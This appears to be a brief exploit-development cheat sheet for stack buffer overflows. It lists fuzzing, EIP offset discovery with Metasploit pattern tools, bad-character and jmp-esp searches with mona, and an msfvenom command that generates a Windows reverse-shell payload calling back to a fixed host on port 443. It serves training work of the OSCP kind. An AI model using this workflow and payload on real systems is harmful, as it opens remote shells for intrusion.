#  Buffer Overflow Cheat Sheet

1. Connecting to vulnerable app
```nc <ip> <port> ```
2. Fuzzing
([fuzzer.py](https://github.com/EdElbakyan/BOF-Cheat-Sheet/blob/main/BOF/fuzzer.py))

3. Finding EIP
([finding_eip.py](https://github.com/EdElbakyan/BOF-Cheat-Sheet/blob/main/BOF/finding-eip.py))
```
msf-pattern_create -l $length
msf-pattern_offset -q $EIP
``` 


4. Determining bad chars
([bad_chars.py](https://github.com/EdElbakyan/BOF-Cheat-Sheet/blob/main/BOF/bad_chars.py))
```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00"
!mona compare -f C:\mona\vulnapp\bytearray.bin -a <ESP_badchar_address>
``` 
5. Finding jmp ESP
```
!mona jmp -r esp -cpb  "\x00\xyz\xxx"
```

6. Generating Shellcode 
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.238.148 LPORT=443 EXITFUNC=thread -b "\x00\x00" -f py -v shellcode

```
7. Exploiting
([exploit.py](https://github.com/EdElbakyan/BOF-Cheat-Sheet/blob/main/BOF/exploit.py.py))
